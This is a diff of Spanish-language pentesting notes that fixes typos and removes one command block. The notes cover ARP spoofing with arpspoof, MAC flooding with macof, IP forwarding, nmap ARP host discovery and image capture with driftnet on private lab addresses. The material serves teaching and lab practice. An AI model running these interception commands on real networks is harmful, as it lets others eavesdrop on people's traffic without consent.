@@ -25,7 +25,7 @@ arp -a
 
 ### CAIN & ABEL
 
-selccionar interface
+selecionar interface
 modo promiscuo
 Start/Stop sniffer
 
@@ -39,7 +39,7 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 sudo macof -i wlan0 -n 32
 
 # ya interceptamos pero el gateway todavia le envia paquetes a la victima
-sudo aprspoof -i wlan0 -t target_ip 192.168.0.1
+sudo arpspoof -i wlan0 -t target_ip 192.168.0.1
 
 # para completar el ataque
 sudo arpspoof -i wlan0 -t 192.168.0.1 target_ip
@@ -118,7 +118,7 @@ nmap -PR -sn 192.168.5.*
 
 ARP es un protocolo utilizado para la resolución de direcciones de la capa de red (dirección IP) en direcciones de la capa de enlace (dirección MAC). ARP funciona en la Capa 2 del modelo OSI, por lo que sólo se puede utilizar para descubrir hosts que se encuentran en la misma subred.
 
-Como se puede ver en la siguiente captura de pantalla, se enviaron varios paquetes ARP a la dirección Broadcast ff:ff:ff:ff:ff:ff. Sin embargo, sólo se obtuvieron respuestas ARP de hosts vivos: 172.16.5.1, 172.16.5.5, 172.16.5.6 y 172.16.5.10.
+Se enviaron varios paquetes ARP a la dirección Broadcast ff:ff:ff:ff:ff:ff. Sin embargo, sólo se obtuvieron respuestas ARP de hosts vivos: 172.16.5.1, 172.16.5.5, 172.16.5.6 y 172.16.5.10.
 
 ### Usando DNS server
 
@@ -188,7 +188,7 @@ arpspoof -i eth1 -t 172.16.5.1 -r 172.16.5.5
 
 los comandos de arriba van a mandar paquetes arp hasta envenenar la tabla ARP en ambos hosts.
 
-A continuación, para ver si hay imágenes en el tráfico entre estos hosts, vamos a lanzar driftnet mientras se ejecutan nuestros ataques arspoof.
+A continuación, para ver si hay imágenes en el tráfico entre estos hosts, vamos a lanzar driftnet mientras se ejecutan arspoof.
 
 ```bash
 driftnet -i eth1
@@ -196,20 +196,6 @@ driftnet -i eth1
 ```
 
 Capturamos el tráfico por alrededor de 5m y lo guardamos en un archivo.
-
-### Capturamos el tráfico entre 172.16.5.6 y 172.16.5.1
-
-```bash
-arpspoof -i eth1 -t 172.16.5.6 -r 172.16.5.1
-
-arpspoof -i eth1 -t 172.16.5.1 -r 172.16.5.6
-
-#####
-
-arpspoof -i eth1 -t 172.16.5.6 -r 172.16.5.10
-
-arpspoof -i eth1 -t 172.16.5.10 -r 172.16.5.6
-```
 
 ### Análizamos el archivo capturado.
 
